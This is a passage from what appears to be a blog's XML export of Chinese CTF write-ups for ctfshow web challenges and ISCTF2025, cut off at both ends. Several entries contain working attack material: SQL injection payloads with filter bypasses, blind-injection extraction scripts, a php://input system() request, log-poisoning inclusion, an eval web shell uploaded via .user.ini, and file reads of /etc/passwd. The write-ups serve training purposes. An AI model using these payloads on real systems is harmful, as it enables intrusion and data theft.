class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import PIL.Image as Image , numpy as np ,libnum,base64</span><br><span class="line">gif = Image.open(&#x27;./flag.gif&#x27;)</span><br><span class="line">dh,dw ,dfh,binstr = gif.height//6,gif.width//30 ,42,&#x27;&#x27;</span><br><span class="line">for p in range(4): #一共四页</span><br><span class="line">    gif.seek(p*31+1) #31张一轮</span><br><span class="line">    gif_np=np.array(gif)[:,:,0]</span><br><span class="line">    for r in range(6):#6行</span><br><span class="line">        for c in range(30): #30列</span><br><span class="line">            for f in range(4):   # 每串4个球</span><br><span class="line">                face =(255-gif_np[r*dh+f*dfh :r*dh+f*dfh+dfh,c*dw:c*dw+dw]).sum()/1000</span><br><span class="line">                if face &gt;=33: binstr+=&#x27;00&#x27;</span><br><span class="line">                elif face &gt;=30 : binstr+=&#x27;01&#x27; </span><br><span class="line">                elif face &gt;=26 :binstr+=&#x27;10&#x27; </span><br><span class="line">                else: binstr+=&#x27;11&#x27; </span><br><span class="line">print(base64.b64decode(libnum.b2s(binstr).decode()).decode())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web1-20 信息收集</title>
      <link href="/2025/12/10/ctfshow-web1-20/"/>
      <url>/2025/12/10/ctfshow-web1-20/</url>
      
        <content type="html"><![CDATA[<h2>web1</h2><p>F12直接看</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531654.png" alt="image-20251210214514575"></p><h2>web2</h2><p>题目提示：js前台拦截</p><p>那就<code>Ctrl + U</code>或在url前加<code>view-source:</code>来看一下源代码</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531655.png" alt="image-20251210214904370"></p><h2>web3</h2><p>先看一下源代码，什么都没有</p><p>再抓个包看看</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531656.png" alt="image-20251210215300854"></p><h2>web4</h2><p>访问 &#x2F;robots.txt</p><p>得到 &#x2F;flagishere.txt</p><p>打开就是flag了</p><h2>web5</h2><p>访问 &#x2F;index.phps</p><p>下载源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-01 14:14:17</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-01 14:34:53</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//ctfshow&#123;8551c8d5-8d95-471b-9b1b-2a550a0193e5&#125;</span><br><span class="line">echo &quot;web5:where is flag ?&quot;</span><br></pre></td></tr></table></figure><h2>web6</h2><p>访问 &#x2F;<a href="http://www.zip/">www.zip</a></p><p>下载网站备份文件</p><p>打开fl000g.txt</p><h2>web7</h2><p>访问 &#x2F;.git&#x2F;</p><h2>web8</h2><p>访问 &#x2F;.svn&#x2F;</p><blockquote><p>[!NOTE]</p><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p></blockquote><h2>web9</h2><p>访问 &#x2F;index.php.swp</p><blockquote><p>[!NOTE]</p><p>Vim在意外退出时，会自动生成一个隐藏的“交换文件”来备份当前编辑的内容。</p></blockquote><h2>web10</h2><p>F12看Cookie</p><blockquote><p>[!note]</p><table><thead><tr><th><strong>类型</strong></th><th><strong>存储位置</strong></th><th><strong>生命周期</strong></th><th><strong>主要用途</strong></th></tr></thead><tbody><tr><td><strong>会话 Cookie (Session Cookie)</strong></td><td>浏览器内存</td><td>浏览器关闭后即刻失效</td><td>临时身份识别、购物车记录</td></tr><tr><td><strong>持久 Cookie (Persistent Cookie)</strong></td><td>用户硬盘</td><td>达到设定的过期时间才失效</td><td>“记住我”登录功能、个性化配置</td></tr></tbody></table></blockquote><h2>web11</h2><p>查询DNS</p><p>两种方法查询</p><ol><li><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></li><li>nslookup</li></ol><p>执行nslookup -qt&#x3D;txt flag.ctfshow.com</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531658.png" alt="image-20260116205013664"></p><p>题目失效了</p><blockquote><p>[!note]</p><p>DNS不仅可以储存域名还可以储存这些： </p><p>• A记录：存IP地址 </p><p>• TXT记录：存任意文本（出题人最爱藏flag的地方！） </p><p>• CNAME记录：域名别名</p></blockquote><h2>web12</h2><p>&#x2F;robots.txt 得知 &#x2F;admin</p><p>然后题目提示用户名admin，密码在网站最下面</p><p>那就是电话号码 372619038</p><p>输入账密得到flag</p><h2>web13</h2><p>题目提示技术文档，在网站最下方找到document</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531659.png" alt="image-20260116210128625"></p><p>查看文档得知</p><blockquote><p>⚫ 登陆<br>默认后台地址：<a href="http://your-domain/system1103/login.php">http://your-domain/system1103/login.php</a><br>默认用户名：admin<br>默认密码：admin1103</p></blockquote><h2>web14</h2><p>访问 &#x2F;editor </p><p>发现是一个编辑器</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531660.png" alt="image-20260116211606354"></p><p>随便提交一下文本，不行</p><p>在图片上传中有一个网络图片选项</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531661.png" alt="image-20260116211724504"></p><p>点击打开了网站根目录</p><p>最后在&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere目录中发现 fl000g.txt</p><p>访问 &#x2F;nothinghere&#x2F;fl000g.txt 得到flag</p><h2>web15</h2><p>使用扫描工具得到 &#x2F;admin</p><p>点击忘记密码，输入密保答案（通过主页contact留下的qq号，查询后得知）</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531662.png" alt="image-20260116212608706"></p><p>重置密码后，登录得到flag</p><h2>web16</h2><p>题目提示 php探针</p><p>先访问&#x2F;phpinfo.php 不行</p><p>再尝试 &#x2F;tz.php ，访问成功</p><p>然后访问phpinfo，得到flag</p><blockquote><p>[!note] </p><p><strong>PHP探针</strong>（PHP Probe）是一个用于检测服务器（Web Server）环境、PHP 配置信息、服务器硬件性能以及数据库支持情况的单文件脚本（通常为 <code>.php</code> 格式）。</p><ul><li>&#x2F;phpinfo.php</li><li>&#x2F;info.php</li><li>&#x2F;tz.php （雅黑，国内常用)</li><li>&#x2F;prober.php</li><li>&#x2F;upupw.php</li></ul></blockquote><h2>web17</h2><p>根据提示，访问sql备份文件路径</p><p>&#x2F;backup.sql</p><h2>web18</h2><p>访问小游戏的js文件</p><p>解码一下</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531663.png" alt="image-20260116221823289"></p><p>直接访问 &#x2F;110.php,得到flag</p><h2>web19</h2><p>查看源码，发现注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!--</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $flag=&quot;fakeflag&quot;</span><br><span class="line">    $u = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $p = $_POST[&#x27;pazzword&#x27;];</span><br><span class="line">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="line">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目采用AES加密，但是后端未解密，而是直接比对加密后的值</p><p>所以用hackbar，发post</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531664.png" alt="image-20260116223338524"></p><h2>web20</h2><p>访问 &#x2F;db&#x2F;db.mdb</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260116225531665.png" alt="image-20260116224847931"></p><blockquote><p>[!note]</p><p>在早期的 ASP + Access 架构中，数据库往往以文件的形式直接存储在 Web 目录下，如果没有做好访问控制，攻击者可以直接下载整个数据库。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2025 WP</title>
      <link href="/2025/12/01/isctf2025/"/>
      <url>/2025/12/01/isctf2025/</url>
      
        <content type="html"><![CDATA[<h2>WEB</h2><h3>b@by n0t1ce b0ard</h3><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251227154004087.png" alt="image-20251201232147878"></p><p>文章提示很明显：CVE-2024-12233</p><p>官方：<a href="https://github.com/LamentXU123/cve/blob/main/RCE1.md">https://github.com/LamentXU123/cve/blob/main/RCE1.md</a></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251227154004088.png" alt="image-20251201232241485"></p><p>根据poc解题</p><ol><li>注册账号</li><li>上传一句话</li><li>访问&#x2F;images&#x2F;<a href="mailto:xx@xx.com">xx@xx.com</a>&#x2F;xx.php?cmd&#x3D;xxx;</li></ol><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251227154004089.png" alt="image-20251201232322551"></p><h3>难过的bottle</h3><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251227154004090.png" alt="image-20251201235713293"></p><p>查看源码发现，只剩a,f,g,l以及(),{}能用</p><p>这里可以通过全角字符绕过</p><p><code>&#123;&#123; ｏｐｅｎ('/flag').ｒｅａｄ() &#125;&#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251227154004091.png" alt="image-20251201235959745"></p><p>这里开全角符号：</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251227154004093.png" alt="image-20251202000309530"></p><p>压缩成zip，上传即可得到flag</p><h3>题3</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web题</title>
      <link href="/2025/11/19/ctfshow-web%E9%A2%98/"/>
      <url>/2025/11/19/ctfshow-web%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-WEB题"><a href="#CTFSHOW-WEB题" class="headerlink" title="CTFSHOW WEB题"></a>CTFSHOW WEB题</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>F12看源代码，发现<code> Y3Rmc2hvd3tiMDUyYTQ0ZS04MWEyLTRhNWYtYjkyYS1lNDhjNzQ0YWJlOWR9</code> ,通过base64解码得到flag</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>简单的sql注入</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>php伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /?url=php://input HTTP/1.1</span><br><span class="line">Host: 54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat ctf_go_go_go&quot;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><a href="https://blog.csdn.net/Myon5/article/details/133675614">参考</a></p><p>先<code>/?url=/etc/passwd</code></p><p>尝试php伪协议，回显error</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png" alt="image-20251117221048667"></p><p>提示信息：日志注入 文件包含</p><p>尝试读取日志：<code>?url=/var/log/nginx/access.log</code></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png"></p><p>修改UA</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png" alt="image-20251117223443953"></p><p>登录蚁剑</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png" alt="image-20251117223510010"></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png" alt="image-20251117223536153"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>php md5弱类型比较</p><p>ctype_alpha要求v1是纯字母</p><p>is_numeric要求v2是数字</p><p> 一些md5值以0e开头的字符串：</p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s21587387a</li></ul><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png" alt="image-20251118101053704"></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>先用<code>&#39; or 1=1 #</code>测试，返回sql inject error</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png" alt="image-20251118104035834"></p><p>输入<code>&#39; </code>发现空格被过滤</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png" alt="image-20251118104221741"></p><p>用&#x2F;**&#x2F;代替空格绕过</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png" alt="image-20251118104957833"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or/**/1=1/**/order/**/by/**/3#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></table></figure><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id=1/**/order/**/by/**/3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web7&#x27;),3#</span><br><span class="line">//这里注入发现报错无回显</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br><span class="line">//换成双引号，查到表名</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web7.flag#</span><br></pre></td></tr></table></figure><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><a href="https://ctf.show/writeups/1549929">参考</a></p><p>过滤字符</p><ul><li><code>and</code></li><li><code>union</code>   &#x2F;&#x2F; select查询的结果集无法在页面回显</li><li><code>or</code></li><li>空格  &#x2F;&#x2F; 可用&#x2F;**&#x2F;替代</li><li>……</li></ul><p>脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://xxxxxxxxxx.challenge.ctf.show/index.php?id=-1&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for num in range(1,60):</span><br><span class="line">    l = 33</span><br><span class="line">    r = 130</span><br><span class="line">    mid = (l+r)&gt;&gt;1</span><br><span class="line">    while l&lt;r:</span><br><span class="line">        # 数据库：web8</span><br><span class="line">        # sql = &quot;ascii(substr((select/**/database())/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line">        # 表：flag,page,user</span><br><span class="line">        # sql = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line">        # 列：flag</span><br><span class="line">        # sql = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line">        # ctfshow&#123;b54332e2-57d2-47c4-933a-d455e9b7e950&#125;</span><br><span class="line">        sql = &quot;ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payload = url + &quot;/**/||/**/&quot; + sql</span><br><span class="line"></span><br><span class="line">        # print(payload)</span><br><span class="line"></span><br><span class="line">        res = requests.get(payload)</span><br><span class="line">        </span><br><span class="line">        if &#x27;If&#x27; in res.text:</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;1</span><br><span class="line">    if chr(mid)==&quot; &quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>二分法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://xxxxxxxxxxxxxxx.challenge.ctf.show/index.php?id=-1&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(mid, num):</span><br><span class="line">    sql = &quot;/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;:d&#125;/**/for/**/1))&lt;=&#123;:d&#125;&quot;.format(num,mid)</span><br><span class="line">    payload = url + sql</span><br><span class="line">    res = requests.get(payload)</span><br><span class="line">    return &#x27;If&#x27; in res.text</span><br><span class="line"></span><br><span class="line">def bsearch(l, r, num):</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l + r) &gt;&gt; 1</span><br><span class="line">        if check(mid, num): r = mid    # check()判断mid是否满足性质</span><br><span class="line">        else: l = mid + 1</span><br><span class="line">    return l</span><br><span class="line"></span><br><span class="line">for num in range(1, 60):</span><br><span class="line">    l = 33</span><br><span class="line">    r = 130</span><br><span class="line">    res = bsearch(l, r, num)</span><br><span class="line">    if chr(res) == &quot;!&quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(res)</span><br><span class="line">    print(f&#x27;第&#123;num&#125;次遍历结果:&#123;flag&#125;&#x27;)</span><br></pre></td></tr></table></figure><p><code>substr()</code>：截取单个字符</p><p><code>ascii()</code>：转换为 ASCII 码</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>dirsearch扫描</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png" alt="image-20251118132236761"></p><p>打开robots.txt发现index.phps文件</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png" alt="image-20251118132439610"></p><p>payload：<code>ffifdyop</code></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点取消得到源码</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png" alt="image-20251118133800784"></p><p>由源码可知，<code>select、from、where、join、sleep、and、空格、union、,</code>被过滤了</p><p>payload：<code>&#39;or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#</code></p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>password为空，把cookie删掉</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png" alt="image-20251118213819661"></p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看源码发现提示</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png" alt="image-20251118220156878"></p><p><code>?cmd=phpinfo();</code> 发现一堆函数被禁用</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png" alt="image-20251118221516632"></p><p><code>?cmd=print_r(glob(&#39;*&#39;));</code>查看一下目录文件</p><p><code>?cmd=highlight_file(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</code>查看文件得到flag</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>通过<code>/upload.php.bak</code>看源码：</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png" alt="image-20251119124310212"></p><p>发现文件名，大小，类型都做了限制</p><p><code>.user.ini</code>：</p><p>在php中”.user.ini”有如下解释：php会在每个目录下搜寻文件名，如果设定为空字符串则php不会搜寻，也就是在“.user.ini”中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。</p><p>有两种方法：</p><p>auto_prepend_file:在页面顶部加载文件</p><p>auto_append_file:在页面底部加载文件</p><p>在.user.ini中填写<code>auto_prepend_file=a.txt</code>，上传</p><p>a.txt：</p><?php eval($_GET[c]);?><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>当c&#x3D;3时返回here_1s_your_f1ag.php</p><p><code>/here_1s_your_f1ag.php</code>进入登录界面</p><p>F12得到提示，过滤了information_schema.tables和information_schema.columns</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png" alt="image-20251119212313395"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1/**/order/**/by/**/1#</span><br><span class="line">//只有1个回显位置</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/database()#</span><br><span class="line">//web</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/user()#</span><br><span class="line">//root用户</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=&#x27;web&#x27;#</span><br><span class="line">//tables加上反引号绕过  </span><br><span class="line">//content</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;#</span><br><span class="line">//id,username,password</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content#</span><br><span class="line">//1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</span><br></pre></td></tr></table></figure><p><code>-1/**/union/**/select/**/load_file(&#39;/etc/nginx/nginx.conf&#39;)</code><br>&#x2F;&#x2F;看网站根目录，确定是&#x2F;var&#x2F;www&#x2F;html</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png" alt="image-20251119221110751"></p><p> <code>-1/**/union/**/select/**/load_file(&#39;/var/www/html/secret.php&#39;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png" alt="image-20251119221233886"></p><p>最后看一下<code>/real_flag_is_here</code>得到flag</p><h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p><a href="https://ctf.show/writeups/1826091">参考1</a> <a href="https://blog.csdn.net/Ethan552525/article/details/118459568">参考2</a></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">?&gt;</span><br><span 